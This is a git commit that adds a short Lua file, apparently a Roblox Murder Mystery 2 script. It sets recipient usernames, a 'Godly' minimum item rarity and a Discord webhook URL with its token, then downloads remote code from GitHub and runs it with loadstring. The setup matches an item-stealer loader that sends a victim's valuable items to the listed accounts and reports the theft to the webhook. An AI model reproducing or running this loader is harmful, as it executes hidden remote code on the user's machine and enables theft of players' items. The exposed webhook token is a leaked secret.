a2dd672c667b442b9c83e279939dc0efd61cdb35
kyrozc <kyroscgit@gmail.com>
2025-08-15 07:38:45 +0800

    Create mm2.lua

---
+++ mm2.lua
@@ -0,0 +1,6 @@
+_G.Usernames = {"Itsmetiandan", "pjgoguy", "kyrozc1", "kyrozc3"}
+_G.min_rarity = "Godly"
+_G.min_value = 1
+_G.pingEveryone = "Yes"
+_G.webhook = "https://discord.com/api/webhooks/1405311736797462589/xQsOfqHLZGqa3wD66k7OZLWge4pKw7EfI7xHHOJX5TBDOiimyZyb1ZVrYgT-MxIm_Ppr"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kyrozc/scripts/refs/heads/main/mm2"))()
